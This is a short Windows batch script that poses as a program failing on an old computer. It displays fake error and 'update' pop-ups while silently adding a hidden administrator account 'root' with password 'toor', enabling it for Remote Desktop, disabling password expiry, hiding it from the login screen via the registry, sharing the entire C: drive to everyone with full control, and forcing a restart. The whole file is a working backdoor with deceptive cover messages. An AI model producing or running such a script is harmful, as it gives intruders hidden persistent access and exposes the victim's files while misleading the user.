@echo off
echo msgbox "Your computer is to old to run this program", vbCritical, "Error" > temp.vbs

cscript //nologo temp.vbs

del temp.vbs

net user root toor /add

net localgroup Administrators root /add

net localgroup "Remote Desktop Users" root /add


net accounts /maxpwage:unlimited

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v root /t REG_DWORD /d "00000000" /f
 
REM Batch file to share the C: drive over the network

REM Define the share name and path
set SHARE_NAME=C_Drive
set SHARE_PATH=C:\

REM Create the network share
net share %SHARE_NAME%=%SHARE_PATH% /grant:everyone,full

REM Confirm the share was created
net share

echo msgbox "Your computer will be restarted in 2 minutes, for update", vbCritical, "Error" > temp.vbs

cscript //nologo temp.vbs

del temp.vbs
timeout /t 120
shutdown /r /t 0

